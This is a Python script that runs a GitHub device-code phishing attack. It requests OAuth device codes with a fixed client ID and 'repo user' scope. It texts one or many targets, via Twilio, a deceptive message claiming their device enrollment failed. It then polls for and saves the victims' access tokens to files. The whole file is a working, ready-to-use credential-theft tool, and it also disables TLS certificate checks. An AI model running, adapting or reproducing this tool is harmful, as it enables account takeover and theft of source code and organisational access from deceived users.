import sys
import time
import json
import urllib.parse
import urllib3
import os.path
import logging
import argparse
import requests
import datetime
import concurrent.futures
from twilio.rest import Client
from cryptography.fernet import Fernet
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__version__ = '1.0.0'

GITHUB_CLIENT_ID = "178c6fc778ccc68e1d6a"
GITHUB_DEVICE_CODE_URL = "https://github.com/login/device/code"
GITHUB_TOKEN_URL = "https://github.com/login/oauth/access_token"
GITHUB_API_BASE_URL = "https://api.github.com"

def validate_encryption_key(encryption_key):
    try:
        decoded_key = base64.urlsafe_b64decode(encryption_key)
        if len(decoded_key) != 32:
            raise ValueError("Encryption key must be 32 bytes after base64 decoding.")
        return Fernet(encryption_key)
    except Exception as e:
        logging.error(f"Invalid encryption key: {e}")
        sys.exit(1)

class User:
    def __init__(self, email, phone=None, encryption_key=None):
        self.email = email
        self.phone = phone
        self.devicecode = None
        self.tokenResponse = None
        self.encryption_cipher = validate_encryption_key(encryption_key) if encryption_key else None
        self.headers = {
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0"
        }

def encrypt_message(message, cipher):
    return cipher.encrypt(message.encode()).decode() if cipher else message

def send_sms(user, message, args):
    # Send the message without encryption
    if args.from_phone and user.phone and args.twl_sid and args.twl_token:
        client = Client(args.twl_sid, args.twl_token)
        client.messages.create(to=user.phone, from_=args.from_phone, body=message)
        logging.info(f"[{user.email}] Text message successfully sent.")
    else:
        logging.info(f"[{user.email}][TODO] Send target '{user.email}' the phishing message via email:\n{message}")

def device_code_auth(user, proxies, args):
    user.headers['Content-Type'] = 'application/x-www-form-urlencoded'
    
    data = {
        "client_id": GITHUB_CLIENT_ID,
        "scope": args.scope or "repo user"
    }
    
    resp = requests.post(GITHUB_DEVICE_CODE_URL, headers=user.headers, data=data, proxies=proxies, verify=False)
    
    if resp.status_code != 200:
        logging.error(f'[{user.email}] Invalid response from GitHub device code endpoint:\n{resp.json()}')
        return False

    user.devicecode = resp.json()
    message = (
        f"CHANGE ORGANIZATION - GitHub Device Enrollment\n\n"
        f"Your GitHub device enrollment for user {user.email} has failed and requires renewal.\n\n"
        f"To avoid losing organizational access to CHANGE ORGANIZATION, please visit: {user.devicecode['verification_uri']}\n\n"
        f"Code: {user.devicecode['user_code']}\n\n"
        f"This code expires in 10 minutes."
    )
    send_sms(user, message, args)
    return user

def process_multiple_users(user_file, proxies, args):
    if not os.path.isfile(user_file):
        logging.error(f"User file {user_file} does not exist!")
        sys.exit(1)

    users = []
    with open(user_file, 'r') as file:
        for line in file:
            line = line.strip()
            if not line:
                continue
            parts = line.split(',')
            email = parts[0]
            phone = parts[1] if len(parts) > 1 else None
            user = User(email, phone, args.encryption_key)
            users.append(device_code_auth(user, proxies, args))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(users)) as executor:
        futures = {executor.submit(poll_auth, user, proxies): user for user in users}
        for future in concurrent.futures.as_completed(futures):
            future.result()

def poll_auth(user, proxies):
    url = GITHUB_TOKEN_URL
    data = {
        "client_id": GITHUB_CLIENT_ID,
        "device_code": user.devicecode["device_code"],
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code"
    }

    stop_time = datetime.datetime.now() + datetime.timedelta(seconds=user.devicecode["expires_in"])
    while True:
        logging.info(f'[{user.email}] Polling for user authentication...')
        resp = requests.post(url, headers=user.headers, data=data, proxies=proxies, verify=False)
        response_data = resp.json()

        if "access_token" in response_data:
            # Encrypt the token here
            encrypted_token = encrypt_message(response_data["access_token"], user.encryption_cipher)
            user.tokenResponse = {"access_token": encrypted_token}
            with open(f'{user.email}.github_token.json', 'w') as f:
                json.dump(user.tokenResponse, f)
            logging.info(f'[{user.email}] Encrypted token info saved to {user.email}.github_token.json')
            return True
        elif response_data.get("error") != "authorization_pending":
            logging.error(f'[{user.email}] Invalid response from token endpoint:\n{response_data}')
            return False
        elif datetime.datetime.now() >= stop_time:
            logging.error(f'[{user.email}] Device code expired.')
            return False
        time.sleep(user.devicecode["interval"])

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=f"GitHub Device Code Authentication - v{__version__}",
                                     formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-e', '--tgt_email', type=str, help='Target email address')
    parser.add_argument('-p', '--tgt_phone', type=str, help='Target phone number (Optional)')
    parser.add_argument('-f', '--user_file', type=str, help='File containing list of target emails and phone numbers')
    parser.add_argument('-P', '--from_phone', type=str, help='Phone number to send texts from via Twilio')
    parser.add_argument('-s', '--twl_sid', type=str, help='Twilio SID')
    parser.add_argument('-k', '--twl_token', type=str, help='Twilio Token')
    parser.add_argument('-S', '--scope', type=str, help='Permissions to request (Default: repo user)')
    parser.add_argument('--encryption_key', type=str, help='Encryption key for secure messages')
    parser.add_argument('--proxy', type=str, help='Proxy (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--debug', action='store_true', help='Enable debugging output')
    args = parser.parse_args()

    logging.basicConfig(format='[%(levelname)s] %(message)s', level=logging.DEBUG if args.debug else logging.INFO)

    proxies = None if not args.proxy else {'http': args.proxy, 'https': args.proxy}

    if args.user_file:
        process_multiple_users(args.user_file, proxies, args)
    elif args.tgt_email:
        user = User(args.tgt_email, args.tgt_phone, args.encryption_key)
        user = device_code_auth(user, proxies, args)
        poll_auth(user, proxies)
    else:
        parser.error('Either target email [-e] or user file [-f] is required.')
